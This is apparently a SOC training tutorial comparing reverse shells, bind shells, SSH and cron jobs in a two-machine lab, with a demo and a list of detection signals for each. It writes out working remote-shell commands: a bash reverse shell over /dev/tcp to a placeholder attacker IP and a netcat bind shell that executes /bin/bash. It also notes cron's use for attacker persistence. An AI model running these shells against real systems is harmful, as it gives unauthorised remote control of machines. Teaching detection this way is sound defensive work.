
Assume:

* Machine A â†’ your â€œattackerâ€ (SOC lab box)
* Machine B â†’ your â€œtargetâ€ (lab server)
* You own both machines
* Do this only in your controlled lab

---

# 1ï¸âƒ£ Reverse Shell

## ğŸ“Œ Concept

Victim machine connects **outbound** to attacker and gives a shell.

Flow:

```
Machine B  â†’  Machine A (listening)
```

Used when inbound ports on victim are blocked.

---

## ğŸ” What Happens Internally

* Shell process starts on Machine B
* It opens TCP connection to Machine A
* Input/output is redirected through that socket

---

## ğŸ§ª Safe Lab Demo

### On Machine A (listener)

Install netcat if needed.

```
nc -lvnp 4444
```

This waits for connections.

---

### On Machine B (simulate reverse connection)

Instead of a malicious payload, use a safe interactive bash:

```
bash -i >& /dev/tcp/<MachineA_IP>/4444 0>&1
```

If connection succeeds, youâ€™ll see shell on Machine A.

To exit:

```
exit
```

---

## ğŸ§  What Your SIEM Would See

* `bash` process created
* Outbound TCP to unusual IP
* Long-lived connection
* Suspicious process tree

---

# 2ï¸âƒ£ Bind Shell

## ğŸ“Œ Concept

Victim opens a port and waits.
Attacker connects in.

Flow:

```
Machine A â†’ Machine B (listening)
```

Opposite of reverse shell.

---

## ğŸ§ª Safe Lab Demo

### On Machine B (open listener)

```
nc -lvnp 5555 -e /bin/bash
```

(If `-e` not supported, use a simpler version without execution and just observe connection.)

---

### On Machine A

```
nc <MachineB_IP> 5555
```

Now you interact with Machine B.

---

## ğŸ§  Detection Clues

* New listening port appears
* Unusual port opened
* Shell attached to network socket
* Firewall log: inbound connection

---

# 3ï¸âƒ£ SSH

## ğŸ“Œ Concept

Legitimate remote shell over encrypted channel.

Flow:

```
Machine A â†’ Machine B (port 22)
```

Uses:

* Encryption
* Authentication
* Secure protocol

Entity:
OpenSSH

---

## ğŸ§ª Safe Lab Demo

On Machine B ensure SSH is running:

```
sudo systemctl status ssh
```

From Machine A:

```
ssh user@MachineB_IP
```

You get encrypted remote shell.

---

## ğŸ§  SIEM Signals

* Login success/failure logs
* Source IP
* Login time anomalies
* Brute-force attempts

---

# 4ï¸âƒ£ Cron Jobs

## ğŸ“Œ Concept

Scheduled tasks in Linux.

Runs commands automatically at specific intervals.

Cron daemon:
Cron

---

## ğŸ§ª Safe Lab Demo

On Machine B:

Edit cron:

```
crontab -e
```

Add:

```
* * * * * echo "Hello from cron" >> /tmp/cron_test.txt
```

This runs every minute.

Check:

```
cat /tmp/cron_test.txt
```

Youâ€™ll see repeated entries.

---

## ğŸ§  Why Cron Matters in Security

Attackers use cron for:

* Persistence
* Scheduled callbacks
* Re-establishing access

SIEM should detect:

* New cron entries
* Unexpected user cron changes

---

# ğŸ”¥ Quick Comparison Table

| Feature           | Reverse Shell     | Bind Shell        | SSH               | Cron              |
| ----------------- | ----------------- | ----------------- | ----------------- | ----------------- |
| Direction         | Victim â†’ Attacker | Attacker â†’ Victim | Attacker â†’ Victim | Local scheduled   |
| Encrypted         | No                | No                | Yes               | N/A               |
| Legitimate Use    | No                | No                | Yes               | Yes               |
| Common for Attack | Yes               | Yes               | If stolen creds   | Yes (persistence) |

---

# ğŸ¯ For Your Two-Machine Lab

Try this sequence:

1. SSH normally â†’ observe logs
2. Run cron job â†’ observe logs
3. Create reverse shell â†’ observe outbound connection
4. Open bind shell â†’ observe inbound connection

Then check:

```
ps aux
netstat -tulpn
ss -tulpn
journalctl
auth.log
```

Thatâ€™s how you connect theory to detection.
